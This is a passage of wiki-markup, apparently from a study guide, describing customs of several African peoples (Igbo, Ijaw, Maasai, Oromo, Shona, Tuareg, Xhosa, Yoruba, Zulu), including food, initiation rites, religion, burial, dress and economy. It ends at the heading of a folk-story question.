|Religion=Today, the majority of the Igbo people are Christian, well over half of whom are Roman Catholics. There are a small population of Igbo Jews. The ancient Igbo religion and traditions are known as Odinani. In Igbo mythology, which is part of their ancient religion, the supreme God is called Chukwu (&quot;great spirit&quot;); Chukwu created the world and everything in it and is associated with all things on Earth. Chukwu is a solar deity. To the ancient Igbo, the Cosmos was divided into four complex parts: creation, known as Okike; supernatural forces or deities called Alusi; Mmuo, which are spirits; and Uwa, the world.

|Education=The nation of Nigeria has made education a priority, so children receive a universal primary education.  Secondary education is rapidly becoming the norm as well.

|Burial=After a death, the body of a prominent member of society is placed on a stool in a sitting posture and is clothed in the deceased's finest garments. Animal sacrifices may be offered to them and they can be well perfumed. Burial usually follows within 24 hours of death. The head of a home is usually buried beneath the floor of his house.

Different types of deaths warrant different types of burials. This is affected by an individual's age, gender and status in society. For example, children are buried in hiding and out of sight, their burials usually take place in the early mornings and late nights. A simple untitled man is buried in front of his house and a simple mother is buried in her place of origin in a garden or a farm-area that belonged to her father. Presently, a majority of the Igbo bury their dead in the western way, although it is not uncommon for burials to be practiced in the traditional Igbo ways.

|Money=
[[File:Stamp Nigeria 1953 0.5p manilla.jpg|thumb|A Stamp depicting Manillas]]
Manillas are ring-like armlets, mostly in bronze or copper, very rarely gold, which served as a form of money or barter coinage and to a degree, ornamentation, amongst certain West African peoples including the Igbo. They also became known as &quot;slave trade money&quot; after the Europeans started using them to acquire slaves for the slave trade into the Americas (as well as England prior to 1807).

|Dress=Traditionally, the attire of the Igbo generally consisted of little clothing as the purpose of clothing originally was to conceal private parts, although elders were fully clothed. Children were usually nude from birth till their adolescence (the time when they were considered to have something to hide) but sometimes ornaments such as beads were worn around the waist for spiritual reasons. Uli body art was used to decorate both men and women in the form of lines forming patterns and shapes on the body.

Women traditionally carry their babies on their backs with a strip of clothing binding the two with a knot at her chest, a practice used by many ethnic groups across Africa. This method has been modernized in the form of the child carrier. In most cases Igbo women did not cover their breast areas. Maidens usually wore a short wrapper with beads around their waist and other ornaments such as necklaces and beads. Both men and women wore wrappers.

Men would wear loin cloths that wrapped round their waist and between their legs to be fastened at their back, the type of clothing appropriate for the intense heat as well as jobs such as farming.

In the same era as the rise of colonial forces in Nigeria, the way the Igbo dressed changed. These changes made the Igbo adopt Westernized clothing such as shirts and trousers. Clothing worn before colonialism became &quot;traditional&quot; and worn on special occasions. The traditional clothing itself became westernized with the introduction of various types of Western clothing including shoes, hats, trousers, etc. Modern Igbo traditional attire, for men, is generally made up of the Isiagu top which resembles the Dashiki worn by other African groups. Isiagu (or Ishi agu) is usually patterned with lions heads embroidered over the clothing and can be a plain color. It is worn with trousers and can be worn with either a traditional title holders hat or with the traditional Igbo stripped men's hat. For women, a puffed sleeve blouse (influenced by European attire) along with two wrappers and a head tie are worn.

|Industry=Growing root crops is the traditional form of employment among the Igbo.  However, in modern times the Igbo can be found working in the oil industry, education, business, and construction.

|Location=Southeastern Nigeria.

|Members=Between 24 and 25 million

===Ijaw===
{{Ethnic group
|name = Ijaw
|image = IjoMask1.jpg
|image caption = An Ijaw mask

|Eating habits = Like many ethnic groups in Nigeria, the Ijaws have many local foods that are not widespread in Nigeria. Many of these foods involve fish and other seafoods such as clams, oysters and periwinkles; yams and plantains. Some of these foods are:
* Polofiyai — A very rich soup made with yams and palm oil
* Kekefiyai— A pottage made with chopped unripened (green) plantains, fish, other seafood or game meat (&quot;bushmeat&quot;) and palm oil
* Fried or roasted fish and plantain — Fish fried in palm oil and served with fried plantains
* Gbe — The grub of the raffia-palm tree beetle that is eaten raw, dried or pickled in palm oil
* Kalabari &quot;sea-harvest&quot; fulo— A rich mixed seafood soup or stew that is eaten with foofoo, rice or yams

|Initiation ceremony = Among the Okrika tribe of the Ijaw people, when a girl is about 17 years old, she (and the other girls in her community) undergoes a ritual called the ''Iria'', which is a coming-of-age ceremony.  This ceremony has elements common to many other initiation ceremonies, including isolation, instruction, transition, and celebration.  In former times, a girl was expected to marry immediately following her ''Iria'', but now it is acceptable for a woman to finish her education (including college) before marriage.  The ''Iria'' still serves as an indication that a woman is eligible for marriage.

|Shamans = Among the Ijaw, witch doctors are neither admired nor sought.  Rather, they are feared, and if a person is suspected of being a witch doctor, his (or her) life could be in mortal danger.  Witch doctors are thought to possess the ability to change themselves into animals, such as rats, foxes, goats, pigs, or the like.  In this form, the witches can bite people, causing infection, and in some cases death.  Witches are considered to be capable of performing almost any evil deed.

|Living conditions = The Ijaw people live by fishing supplemented by farming paddy-rice, plantains, yams, cocoyams, bananas and other vegetables as well as tropical fruits such as guava, mangoes and pineapples; and trading. Smoke-dried fish, timber, palm oil and palm kernels are processed for export. While some clans had powerful chiefs and a stratified society, other clans are believed not to have had any centralized confederacies until the arrival of the British. However, owing to influence of the neighbouring Kingdom of Benin individual communities even in the western Niger Delta also had chiefs and governments at the village level.

|Religion=Although the Ijaw are now primarily Christians (95% profess to be), with Catholicism and Anglicanism being the varieties of Christianity most prevalent among them, the Ijaw have elaborate traditional religious practices of their own. Veneration of ancestors plays a central role in Ijaw traditional religion, while water spirits, known as Owuamapu figure prominently in the Ijaw pantheon. In addition, the Ijaw practice a form of divination called Igbadai, in which recently deceased individuals are interrogated on the causes of their death.

Ijaw religious beliefs hold that water spirits are like humans in having personal strengths and shortcomings, and that humans dwell among the water spirits before being born. The role of prayer in the traditional Ijaw system of belief is to maintain the living in the good graces of the water spirits among whom they dwelt before being born into this world, and each year the Ijaw hold celebrations in honor the spirits lasting for several days. Central to the festivities is the role of masquerades, in which men wearing elaborate outfits and carved masks dance to the beat of drums and manifest the influence of the water spirits through the quality and intensity of their dancing. Particularly spectacular masqueraders are taken to actually be in the possession of the spirits on whose behalf they are dancing.

|Education=Because the government of Nigeria places high importance on education, the Ijaw people receive a universal primary eduction.  Secondary schooling is also quite common.

|Burial=When a person dies, the Ijaw consult an oracle to determine whether or not the deceased was a witch or a wizard.  If this is found the be the case, the person is buried outside the city.  Otherwise, burial takes place within the city.

|Money=Like the Igbo, the Ijaw used Manillas as currency.

|Dress=Ijaws wear flowing robes and wrappers around the waist. They carry walking sticks which are topped with a hat.

|Industry=Being a maritime people, many Ijaws were employed in the merchant shipping sector in the early and mid-20th century (pre-Nigerian independence). With the advent of oil and gas exploration in their territory, some are employed in that sector. Other main occupation are in the civil service of the Nigerian State of Bayelsa where they are predominant.

===Maasai===
{{Ethnic group
|name = Maasai
|image = Maasai women and children.jpg
|image caption =Maasai women and children 

|Eating habits = Traditionally, the Maasai diet consisted of meat, milk, and blood from cattle. An ILCA study (Nestel 1989) states: “Today, the staple diet of the Maasai consists of cow's milk and maize-meal. The former is largely drunk fresh or in sweet tea and the latter is used to make a liquid or solid porridge. The solid porridge is known as uoali and is eaten with milk; unlike the liquid porridge, uoali is not prepared with milk. Meat, although an important food, is consumed irregularly and cannot be classified as a staple food. Animal fats or butter are used in cooking, primarily of porridge, maize, and beans. Butter is also an important infant food. Blood is rarely drunk.”

|Initiation ceremony =The central unit of Maasai society is the age-set. Although young boys are sent out with the calves and lambs as soon as they can toddle, childhood for boys is mostly playtime, with the exception of ritual beatings to test courage and endurance. Girls are responsible for chores such as cooking and milking, skills which they learn from their mothers at an early age. Every 15 years or so, a new and individually named generation of Morans or Il-murran (warriors) will be initiated. This involves most boys between 12 and 25, who have reached puberty and are not part of the previous age-set. One rite of passage from boyhood to the status of junior warrior is a painful circumcision ceremony, which is performed without anaesthetic. This ritual is typically performed by the elders, who use a sharpened knife and makeshift cattle hide bandages for the procedure. The Maa word for circumcision is emorata. The boy must endure the operation in silence. Expressions of pain bring dishonor, albeit temporarily. Any exclamations can cause a mistake in the delicate and tedious process, which can result in life-long scarring, dysfunction, and pain. The healing process will take 3–4 months, during which urination is painful and nearly impossible at times, and boys must remain in black cloths for a period of 4–8 months.

During this period, the newly circumcised young men will live in a &quot;manyatta&quot;, a &quot;village&quot; built by their mothers. The manyatta has no encircling barricade for protection, emphasizing the warrior role of protecting the community. No inner krall is built, since warriors neither own cattle or undertake stock duties. Further rites of passage are required before achieving the status of senior warrior, culminating in the eunoto ceremony, the &quot;coming of age&quot;.

|Shamans = The central human figure in the Maasai religious system is the laibon who may be involved in: shamanistic healing, divination and prophecy, insuring success in war or adequate rainfall. Whatever power an individual laibon had was a function of personality rather than position.

|Living conditions = As a historically nomadic and then semi-nomadic people, the Maasai have traditionally relied on local, readily available materials and indigenous technology to construct their housing. The traditional Maasai house was in the first instance designed for people on the move and was thus very impermanent in nature. The Inkajijik (houses) are either star-shaped or circular, and are constructed by able-bodied women. The structural framework is formed of timber poles fixed directly into the ground and interwoven with a lattice of smaller branches, which is then plastered with a mix of mud, sticks, grass, cow dung and human urine, and ash. The enkaji is small, measuring about 3m x 5m and standing only 1.5m high. Within this space the family cooks, eats, sleeps, socializes and stores food, fuel and other household possessions. Small livestock are also often accommodated within the enkaji. Villages are enclosed in a circular fence (Enkang) built by the men, usually of thorned acacia, a native tree. At night all cows, goats and sheep are placed in an enclosure in the center, safe from wild animals.

|Religion = The Maasai are monotheistic, and they call God Enkai or Engai. Engai is a single deity with a dual nature: Engai Narok (Black God) is benevolent, and Engai Nanyokie (Red God) is vengeful. The &quot;Mountain of God&quot;, Ol Doinyo Lengai, is located in northernmost Tanzania.  Many Maasai have become Christian, and to a lesser extent, Muslim.

|Education=During the British rule of East Africa, the Maasai engaged in a form passive resistance to preserve their culture.  THey refused to settle down, take up agriculture, or send their children to be educated by the British.  Education was seen as a way to strip them of their culture.  Today with environmental pressures mounting, the Maasai are finding that their children need education in order to survive.  Maasai Education Discovery (MED) is a non-governmental organization which operates a dual-culture education system.  They teach traditional Maasai skills as well as the sorts of things one would expect to learn with a western education (reading, writing, arithmetic).

|Burial=For Maasai living a traditional life, the end of life is virtually without ceremony, and the dead are left out for scavengers.  Burial has in the past been reserved for great chiefs, since it is believed to be harmful to the soil.

|Money=Cattle form the basis of nearly all Maasai transactions.

|Dress=Clothing varies by age, sex, and place. Young men, for instance, wear black for several months following their circumcision. However, red is a favored color. Blue, black, striped, and checkered cloth are also worn, as are multicolored African designs. The Maasai began to replace animal-skin, calf hides and sheep skin, with commercial cotton cloth in the 1960s.

Shúkà is the Maa word for sheets traditionally worn wrapped around the body, one over each shoulder, then a third over the top of them. These are typically red, though with some other colors (e.g. blue) and patterns (e.g. plaid.) Pink, even with flowers, is not shunned by warriors. One piece garments known as kanga, a Swahilli term, are common. Maasai near the coast may wear kikoi, a type of sarong that comes in many different colors and textiles. However, the preferred style is stripes.

|Industry=Traditional Maasai lifestyle centers around their cattle which constitutes the primary source of food. The measure of a man's wealth is in terms of cattle and children. A herd of 50 cattle is respectable, and the more children the better. A man who has plenty of one but not the other is considered to be poor. A Maasai myth relates that God gave them all the cattle on earth, leading to the belief that rustling cattle from other tribes is a matter of taking back what is rightfully theirs, a practice that has become much less common.
|Location=The Maasai are a semi-nomadic people located in Kenya and northern Tanzania. Due to their distinctive customs and dress and residence near the many game parks of East Africa, they are among the most well known of African ethnic groups.

===Oromo===
{{Ethnic group
|name = Oromo
|image = Nakempte Boys.jpg
|image caption = Oromo boys

|Eating habits = Ethoipian cuisine remains a mystery to most of the world because visitors (who are most often European) are most often fed European cuisine.  The Oromo believe it is rude to eat food in front of someone else who is not eating, and thus, food is not prepared in the streets.

|Initiation ceremony =In a short article, Geoffrey W. Arnott described an Oromo rite of passage in which young men run over the backs of bulls surrounded by the village community. Bruce Parry filmed the same practice among the Hamar people for his BBC television series &quot;Tribe&quot; transmitted in July 2006.

|Shamans = Qallu is a name given to the families who are believed to be descents of Abu Bakr al-Siddiq, the first Caliph of Islam, and who are now living in many areas of Eastern Ethiopia. The Qallu are so named by Somali, Oromo and Harari peoples; within each of these ethnic groups, there is a tribe called &quot;Qallu&quot;. The term means &quot;people of the religion&quot; because they were the first to bring Islam to their respective areas; on the other hand, the Oromos use the word as &quot;a negotiator between mankind and God&quot;. The Qallu inhabit Hararghe, Ogaden, and Dire Dawa as well as the Republics of Somalia and Djibouti. In Somalia, it is also said that Qallu are related with Sheekhaal Clan or they are part of the larger Fiqi Omar Clan. 

|Living conditions = About 95% are settled agriculturalists and nomadic pastoralists, practising archaic farming methods and living at subsistence level. A few live in the urban centres.

|Religion=In the 2007 Ethiopian census in the 88% Oromo region of Oromia, 47% were Islamic, 30% Orthodox Christians, 17.7% Protestant Christian, 3.3% Traditional, and the remaining 1.6% constitute other religious groups. Protestant Christianity is the fastest growing religion inside the Oromo community. In urban areas of Oromia, Othodox Christianity constitute 67.8% of the population, followed by Islam 24% and Protestants 7%. But adherence to traditional practices and rituals is still common among many Oromo people regardless of religious background.

|Education=In Oromia, the educational system is virtually non-existent because schools do not have adequate supplies. Further, the lack of experienced teachers and lack of transportation places additional hampers on education.  There are not enough schools or libraries, either in existence or being built, so children who live far away cannot hope to receive a formal education. 

|Burial=When an Oromo person dies, the body is washed and tied into a fetal position.  The body is then wrapped in a perfumed mat.  The intestines are removed from the body of an elite person, whose burial is done in private to preserve the idea that they are not physically mortal.  Graves are generally {{units|2 to 2.5 meters|6 to 8 feet}} deep.  The body is covered with stones, which are placed on the grave in symbolically important arrangements.  Each child of the deceased places a stone on the grave in birth order, and thus, the circle of stones represents each of the deceased person's children.  Other people also place stones on the grave, and a person's importance is measured by how many people placed stones there.  The family of the deceased will shave their heads in mourning.

|Money=The Oromo use the Ethiopian Birr as their currency.

|Dress=The Oromo economy is based on livestock, and traditional Oromo dress reflects this, featuring leather and beads.  During festivals, men may wear a headdress mande from a lion's mane or baboon skin, and carry a shield covered with the hide of a hippo.  

|Industry=About 95% are settled agriculturalists and nomadic pastoralists, practicing archaic farming methods and living at subsistence level.

|Location=The Oromo are found in Ethiopia, in northern Kenya, and to a lesser extent in parts of Somalia.

===Shona===
{{Ethnic group
|name = Shona
|image = Shona witch doctor (Zimbabwe).jpg
|image caption = Shona religious priest and healer

|Eating habits = The majority of Zimbabweans depend on a few staple foods. Meat, beef and to a lesser extent chicken are especially popular, though consumption has declined under the Mugabe regime due to falling incomes. &quot;Mealie meal&quot; (cornmeal) is used to prepare sadza or isitshwala and bota or ilambazi. Sadza is a porridge made by mixing the cornmeal with water to produce a thick paste. After the paste has been cooking for several minutes, more cornmeal is added to thicken the paste. This is eaten as lunch and dinner, usually with greens (such as spinach, chomolia, collard greens), beans and meat that has been stewed, grilled, or roasted. Sadza is also commonly eaten with curdled milk, commonly known as lacto (mukaka wakakora), or dried Tanganyika sardine, known locally as kapenta or matemba. Bota is a thinner porridge, cooked without the additional cornmeal and usually flavoured with peanut butter, milk, butter, or, sometimes, jam. Bota is usually eaten for breakfast.

|Initiation ceremony =Traditional rites of passage among the Shona are rarely practiced in modern times, having been supplanted by western ceremonies such as baptism an dbirthday celebrations.  However, some Shona still practice a ceremony initiating a boy into manhood.  In this ceremony, the boy undergoes a public circumcision.

|Shamans = Shona healers are called ''nganga''.  ''Nganga'' primarily use two forms of divination to determine the cause of an illness (or other misfortune).  One form of divination is called ''Hakata'', in which the nganga consults a set of charms, each of which has its own significance.  The other form is ''possession'' in which the nganga causes the petitioner to enter a state of hypnosis.  While in this state, anything the petitioner says is interpreted as having come from a spirit.  

|Living conditions = According to the United Nations World Health Organisation, the life expectancy for men is 37 years and the life expectancy for women is 34 years of age, the lowest in the world in 2006. The HIV infection rate in Zimbabwe was estimated to be 20.1% for people aged 15–49 in 2006. UNESCO reported a decline in HIV prevalence among pregnant women from 26% in 2002 to 21% in 2004.

|Religion=Sixty two percent of Zimbabweans attend Christian religious services. The largest Christian churches are Anglican, Roman Catholic, Seventh-day Adventist, and Methodist. However like most former European colonies, Christianity is often mixed with enduring traditional beliefs. Besides Christianity, ancestral worship is the most practiced non-Christian religion which involves ancestor worship and spiritual intercession; the Mbira Dza Vadzimu, which means &quot;Voice of the Ancestors&quot;, an instrument related to many lamellophones ubiquitous throughout Africa, is central to many ceremonial proceedings. Mwari simply means &quot;God the Creator&quot; (musika vanhu in Shona). Around 1% of the population is Muslim.

|Education=Zimbabwe has an adult literacy rate of approximately 90% which is amongst the highest in Africa. Since 1995 the adult literacy rate of Zimbabwe has steadily decreased, a trend shared by other African countries.

The wealthier portion of the population usually send their children to independent schools as opposed to the government-run schools which are attended by the majority as these are subsidised by the government. School education was made free in 1980, but since 1988, the government has steadily increased the charges attached to school enrollment until they now greatly exceed the real value of fees in 1980. The Ministry of Education of Zimbabwe maintains and operates the government schools but the fees charged by independent schools are regulated by the cabinet of Zimbabwe.

Zimbabwe's education system consists of 7 years of primary and 6 years of secondary schooling before students can enter university in the country or abroad. The academic year in Zimbabwe runs from January to December, with three month terms, broken up by one month holidays, with a total of 40 weeks of school per year. National examinations are written during the third term in November, with &quot;O&quot; level and &quot;A&quot; level subjects also offered in June.

|Burial=People of the same clan use a common set of totems.  A person with a different totem cannot initiate burial of the deceased. A person of the same totem even when coming from a different tribe, can initiate burial of the deceased. For example a Ndebele of the Mpofu totem can initiate burial of a Shona of the Mhofu totem and that is perfectly acceptable in Shona tradition. But a Shona of a different totem cannot perform the ritual functions required to initiate burial of the deceased.

If a person initiates the burial of a person of a different totem, he runs the risk of being asked to pay a fine to the family of the deceased. Such fines traditionally were paid with cattle or goats but nowadays substantial amounts of money can be asked for.

|Money=The official unit of currency is the Zimbabwean dolloar.  Although it is still the official currency, the United States dollar, South African rand, Botswanan pula, Pound sterling and Euro are mostly used instead as the local currency is practically worthless. The US Dollar has been adopted as the official currency for all government transactions with the new power-sharing regime.

Inflation rose from an annual rate of 32% in 1998 to an IMF estimate of 150,000% in December 2007, and to an official estimated high of 231,000,000% in July 2008 according to the country's Central Statistical Office. This represented a state of hyperinflation, and the central bank introduced a new 100 billion dollar note. As of November 2008, unofficial figures put Zimbabwe's annual inflation rate at 516 quintillion per cent, with prices doubling every 1.3 days. Zimbabwe's inflation crisis is now (2009) the second worst inflation spike in history, behind the hyperinflationary crisis of Hungary in 1946, in which prices doubled every 15.6 hours. By 2005, the purchasing power of the average Zimbabwean had dropped to the same levels in real terms as 1953. Local residents have largely resorted to buying essentials from neighbouring Botswana, South Africa and Zambia.

|Dress=Today the Shona dress in western clothing.  In the 19th century the men wore breech clothes of animal hide.

|Industry=The Shona were traditionally agricultural, growing beans, peanuts, corn, pumpkins, and sweet potatoes.  Mineral exports, agriculture, and tourism are the main foreign currency earners of Zimbabwe. The mining sector remains very lucrative, with some of the world's largest platinum reserves being mined by Anglo-American and Impala Platinum. Zimbabwe is the biggest trading partner of South Africa on the continent.

|Location=Zimbabwe and southern Mozambique. A small group of Shona speaking migrants of the late 1800s also live in Zambia, in the Zambezi valley, in Chieftainess Chiawa's area.

===Tuareg===
{{Ethnic group
|name =Tuareg
|image = Tuareg2.JPG
|image caption =Tuareg from the Hoggar (Algeria) wearing the classical indigo turban.
 
|Eating habits = The Tuareg diet consists mostly of grains supplemented with fruits such as dates and melons (when in season), and milk and cheese.  Meat is reserved for special occasions.

|Initiation ceremony = When a male turns 18 years old, he receives a veil to wear over his face.  The veil is wrapped around his face by the marabout (see below) in a special ritual.  Once a man gets his veil, he is considered eligible for marriage.

|Shamans = After the adoption of Islam, a separate class of religious clerics, the Ineslemen or marabouts, also became integral to Tuareg social structure. Following the decimation of many clans' noble Imajaghan caste in the colonial wars of the 19th and 20th centuries, the Ineslemen gained leadership in some clans, despite their often servile origins. Traditionally Ineslemen clans were not armed. They provided spiritual guidance for the nobility, and received protection and alms in return.

|Living conditions = The oldest legends says Tuarerg once lived in grottoes, akazam, and then they lived in folliage beds made on the top acacia trees, tasagesaget, to avoid numerous wild animal during old times and even to this day to escape from mosquitoes. Other kinds of traditional housing include:
* ahaket: Tuareg goatskin red tent
* tafala: a shade made of millet sticks
* akarban also called takabart: temporary hat for winter season
* ategham: hat for hot season
* taghazamt: adobe house for long stay


|Religion = The Tuareg are predominantly Muslim and generally follow the Maliki madhhab, one of the four schools of Fiqh or religious law within Sunni Islam. 

|Education=Until recently, the Tuareg resisted sending their children to secular schools out of distrust of the government.  Today most children finish primary school, and some go on to university.

|Burial=The dead are buried as soon as possible.  The funeral is presided over by the marabout, and is followed by ''iwichken'' (condolences).

|Money=The Tuareg use modern currency.

|Dress=Unlike in many other Muslim societies, women do not traditionally wear the veil, whereas men do. The most famous Tuareg symbol is the Tagelmust (also called éghéwed in Malian Tamasheq, or referred to as a Cheche, pronounced &quot;Shesh&quot;, from Berber), an often indigo blue-colored veil called Alasho. The men's facial covering originates from the belief that such action wards off evil spirits. It may have related instrumentally from the need for protection from the harsh desert sands as well. It is a firmly established tradition, as is the wearing of amulets containing verses from the Qur'an. Taking on the veil is associated with the rite of passage to manhood; men begin wearing a veil when they reach maturity. The veil usually conceals their face, excluding their eyes and the top of the nose.

|Industry=The Tuareg are a pastoral people, having an economy based on livestock breeding, trading, and agriculture.  Since Prehistoric times Tuareg peoples and their Berber ancestors (the Garamantes) have been organising caravans for trading across the Sahara desert.  They also operate salt mines.  

|Location=The Tuareg people inhabit a large area, covering almost all the middle and western Sahara and the north-central Sahel. In Tuareg terms, the Sahara is not one desert but many, so they call it Tinariwen (&quot;the Deserts&quot;). Among the many deserts in Africa, there is the true desert Tenere. Other deserts are more and less arid, flat and mountainous: Adrar, Tagant, Tawat (Touat) Tanezruft, Adghagh n Fughas, Tamasna, Azawagh, Adar, Damargu, Tagama, Manga, Ayr, Tarramit (Termit), Kawar, Djado, Tadmait, Admer, Igharghar, Ahaggar, Tassili N'Ajjer, Tadrart, Idhan, Tanghart, Fezzan, Tibesti, Kalansho, Libyan Desert, etc.

===Xhosa===
{{Ethnic group
|name =Xhosa
|image = Xhosa-children.JPG
|image caption = Xhosa children

|Eating habits = The Xhosa settled on mountain slopes of the Amatola and the Winterberg Mountains. Many streams drain into great rivers of this Xhosa territory including the Kei and Fish Rivers. Rich soils and plentiful rainfall make the river basins good for farming and grazing making cattle important and the basis of wealth.

Traditional foods include beef (''Inyama yenkomo''), mutton (''Inyama yegusha''), and goat meat, sorghum, maize and dry maize porridge (''umphokoqo''), ''&quot;umngqusho&quot;'' (made from dried, stamped corn and dried beans), milk (often fermented, called ''amasi''), pumpkins (''amathanga''), beans (''iimbotyi''), and vegetables.

|Initiation ceremony =One traditional ritual that is still regularly practiced is the manhood ritual, a secret rite that marks the transition from boyhood to adulthood (Ulwaluko). After ritual circumcision the initiates (abakwetha) live in isolation for up to several weeks, often in the mountains. During the process of healing they smear white clay on their bodies and observe numerous taboos.

|Shamans = Traditional Xhosa culture includes diviners known as amagqirha, who serve as herbalists, prophets, and healers for the community. This job is mostly taken by women, who spend five years in apprenticeship.

The Xhosas have a strong oral tradition with many stories of ancestral heroes; according to tradition, the leader from whose name the Xhosa people take their name was the first human on Earth. Other traditions have it that all Xhosas are descended from one ancestor named Tshawe.

The key figure in the Xhosa oral tradition is the imbongi (plural: iimbongi) or praise singer. Iimbongi traditionally live close to the chief's &quot;great place&quot; (the cultural and political focus of his activity); they accompany the chief on important occasions - the imbongi Zolani Mkiva preceded Nelson Mandela at his Presidential inauguration in 1994. Iimbongis' poetry, called imibongo, praises the actions and adventures of chiefs and ancestors.

|Living conditions = The Xhosa include both the poorest and the richest members of South African society.  The poor live in thatched-roof round huts, and in labor camps, while the wealthiest live in modern houses in suburban neighborhoods.

|Religion = The supreme being is called uThixo or uQamata. Ancestors act as intermediaries and play a part in the lives of the living; they are honoured in rituals. Dreams play an important role in divination and contact with ancestors. Traditional religious practice features rituals, initiations, and feasts. Modern rituals typically pertain to matters of illness and psychological well-being.

Christian missionaries established outposts among the Xhosa in the 1820s, and the first Bible translation was in the mid-1850s, partially done by Henry Hare Dugmore. Xhosa did not convert in great numbers until the 1900s, but now many are Christian, particularly within the African Initiated Churches such as the Zion Christian Church. Some denominations combine Christianity with traditional beliefs.

|Education=Education in primary-schools serving Xhosa-speaking communities is in the Xhosa language, but this is replaced by English after the early primary grades. Xhosa is still considered as a studied subject, however, and it is possible to major in Xhosa at the university level.

|Burial=Xhosa homesteads once featured a cattle kraal, and a chief was traditionally buried in the center of this.  Other people were buried outside the villages.

|Money=In old times, the Xhosa used cattle as money, but these days they use modern currency.

|Dress=Xhosa today have adopted the modern, Western style of clothing.  It has recently become acceptable for women to wear slacks.

|Industry=Prior to the end of Apartheid, most Xhosa men were employed as miners, and women worked on farms or as domestic servants.  Those with the education work in the healthcare, education, and in the government.

|Location=The Xhosa are people living in south-east South Africa, and in the last two centuries throughout the southern and central-southern parts of the country.

|Religion=Yoruba religion and mythology is a major influence in West Africa, chiefly in Nigeria, and it has given origin to several New World religions such as Santería in Cuba, Puerto Rico and Candomblé in Brazil.

The popularly known Vodou religion of Haiti combines the religious beliefs of the many different African ethnic nationalities taken to the island with the structure and liturgy from the Fon-Ewe of present-day Benin and the Congo-Angolan culture area, but Yoruba-derived religious ideology and deities also play an important role.

Yoruba deities include &quot;Ọya&quot; (wind/storm), &quot;Ifá&quot; (divination or fate), &quot;Ẹlẹda&quot; (destiny), Orisha or Orisa &quot;Ibeji&quot; (twin), &quot;Ọsanyin&quot; (medicines and healing) and &quot;Ọsun&quot; (goddess of fertility, protector of children and mothers), Sango (God of thunder).

Human beings and other sentient creatures are also assumed to have their own individual deity of destiny, called &quot;Ori&quot;, who is venerated through a sculpture symbolically decorated with cowrie shells. Traditionally, dead parents and other ancestors are also believed to possess powers of protection over their descendants. This belief is expressed in veneration and sacrifice on the grave or symbol of the ancestor, or as a community in the observance of the Egungun festival where the ancestors are represented as a colorful masquerade of costumed and masked men who represent the ancestral spirits. Dead parents and ancestors are also commonly venerated by pouring libations to the earth and the breaking of kolanuts in their honor at special occasions.

Today, many contemporary Yoruba are active Christians (60%) and Muslims (30%), yet retain many of the moral and cultural concepts of their traditional faith.

|image caption = Zulu worshippers at an African Apostolic Church, near Oribi Gorge

|Eating habits = In the precolonial period, indigenous cuisine was characterized by the use of a very wide range of fruits, nuts, bulbs, leaves and other products gathered from wild plants and by the hunting of wild game. The domestication of cattle in the region about two thousand years ago by Khoisan groups enabled the use of milk products and the availability of fresh meat on demand. However, during the colonial period the seizure of communal land in South Africa restricted and discouraged traditional agriculture and wild harvesting, and reduced the extent of land available to black people.

|Initiation ceremony =Boys between the ages of 16-18 were taken to an isolated area and housed in grass huts.  During their stay, no one was allowed to see them other than a small group of older women who were there to give them food and watch over them.  The boys are given a small item of clothing, which is the only thing they were prior to their circumcision.  After the circumcision, they are given a new set of clothing made from leather, and return to their village where they are considered to have entered manhood.

The initiation ceremony for girls began as soon as she began menstruation.  She would gather the roots of a certain shrub and use it to make a porridge which she would eat exclusively for seven days.  During this time, and for the enxt three months or so, she was confined to her mother's hut.  During this time she was to learn to perform several tasks expected of women, including basket weaving and making beaded clothing.  She was allowed to have one friend come and stay with her during this time.  She was not allowed to be seen by anyone other than her mother and this friend.  Her sisters would make her a new outfit from twisted grass, and at the end of the three months, she would put this on, be presented to the village, and she and her friend and sisters would dance and sing, celebrating the end of her initiation.  On the following day, the grass outfit would be burned, signifying that the girl had become a woman.

|Shamans = ''Inyanga'' (literally &quot;the man of the trees&quot;) is a Zulu word for a traditional healer.

Although the word ''sangoma'' is generally used in South African English to mean all types of traditional Southern African healers, inyangas and sangomas are in fact different. An inyanga is an herbalist who is concerned with medicines made from plants and animals, while a sangoma relies primarily on divination for healing purposes. The knowledge of the inyanga is passed through the generations from parent to child.

In modern society the status of these medicine men or women has been translated into wealth. Most izinyanga (plural of inyanga) in urban areas have shops with consulting rooms where they sell their medicines.

|Living conditions = The modern Zulu population is fairly evenly distributed in both urban and rural areas. Although KwaZulu-Natal is still their heartland, large numbers have been attracted to the relative economic prosperity of Gauteng province.

|Religion=Most Zulu people state their beliefs to be Christian. Some of the most common churches to which they belong are African Initiated Churches, especially the Zion Christian Church and various Apostolic Churches, although membership of major European Churches, such as the Dutch Reformed, Anglican and Catholic Churches is also common. Nevertheless, many Zulus retain their traditional pre-Christian belief system of ancestor worship in parallel with their Christianity.

Zulu religion includes belief in a creator God (Nkulunkulu) who is above interacting in day-to-day human affairs, although this belief appears to have originated from efforts by early Christian missionaries to frame the idea of the Christian God in Zulu terms. Traditionally, the more strongly held Zulu belief was in ancestor spirits (Amatongo or Amadhlozi), who had the power to intervene in people's lives, for good or ill. This belief continues to be widespread among the modern Zulu population. 

|Education=Illiteracy is high among the Zulu, though with the formation of the post-Apartheid goverment, this is changing.  Children attend school starting at age 7 and continue sometimes until they are 24 (though not continuously).  Many children take long breaks during their school years.  Graduation is considered a very high achievement.

|Burial=The Zulus burn all the belongings of the deceased to prevent them from returning to haunt the living.

|Money=Prior to colonialization, the Zulu used cattle as currency.  Today they use the South African rand.

|Dress=Traditional male clothing is usually light, consisting of a two-part apron (similar to a loincloth) used to cover the genitals and buttocks. The front piece is called the umutsha, and is usually made of springbok or other animal hide twisted into different bands. The rear piece, called the ibheshu, is made of a single piece of springbok or cattle hide, and its length is usually used as an indicator of age and social position; longer amabheshu (plural of ibheshu) are worn by older men. Married men will usually also wear a headband, called the umqhele, which is usually also made of springbok hide, or leopard hide by men of higher social status, such as chiefs. Zulu men will also wear cow tails as bracelets and anklets called imishokobezi during ceremonies and rituals, such as weddings or dances.

|Industry=Sugar refining is the main industry. Sheep, cattle, dairy, citrus fruits, corn, sorghum, cotton, bananas, and pineapples are also raised. In addition to sugar refining, industries (located mainly in and around Durban) include textile, clothing, chemicals, rubber, fertilizer, paper, vehicle assembly and food-processing plants, tanneries, and oil refineries. There are large aluminum-smelting plants at Richards Bay, on the north coast.

|Location=Most Zulu live in the province of KwaZulu-Natal, South Africa. Small numbers also live in Zimbabwe, Zambia, and Mozambique.

|Members=An estimated 10-11 million

==3. Tell an African folk story bringing out its moral. ==
===How the Monkeys Saved the Fish===
This is a traditional Tanzanian folktale.

